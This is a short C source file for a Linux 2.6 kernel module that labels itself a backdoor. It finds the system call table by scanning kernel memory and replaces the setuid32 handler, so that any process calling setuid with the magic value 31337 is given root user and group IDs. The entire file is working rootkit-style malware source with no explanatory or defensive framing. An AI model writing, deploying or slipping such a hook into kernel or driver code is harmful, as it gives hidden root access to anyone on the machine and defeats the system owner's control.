/* Module backdoor for Linux 2.6.x */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>

MODULE_LICENSE ("GPL");

unsigned long* sys_call_table;
int (*orig_setuid)(uid_t);

void find_sys_call_table(void)
{
  int i;
  unsigned long *ptr;
  unsigned long arr[4];
  ptr = (unsigned long *)((init_mm.end_code + 4) & 0xfffffffc);
  while((unsigned long)ptr < (unsigned long)init_mm.end_data) {
    if (*ptr == (unsigned long)((unsigned long *)sys_close)) {
      for(i = 0; i < 4; i++) {
	arr[i] = *(ptr + i);
	arr[i] = (arr[i] >> 16) & 0x0000ffff;
      }
      if(arr[0] != arr[2] || arr[1] != arr[3]) {
        sys_call_table = (ptr - __NR_close);
        break;
      }
    }
    ptr++;
  }
}

int change_setuid(uid_t uid)
{
  if (uid == 31337)
  {
      current->uid = 0;
      current->euid = 0;
      current->gid = 0;
      current->egid = 0;
      return 0;
  }
  return (*orig_setuid)(uid);
}

int init_module(void)
{
  find_sys_call_table();
  orig_setuid = (void *)sys_call_table[__NR_setuid32];
  sys_call_table[__NR_setuid32] = (unsigned long)change_setuid;
  return 0;
}

void cleanup_module(void)
{
  sys_call_table[__NR_setuid32] = (unsigned long)orig_setuid;
}
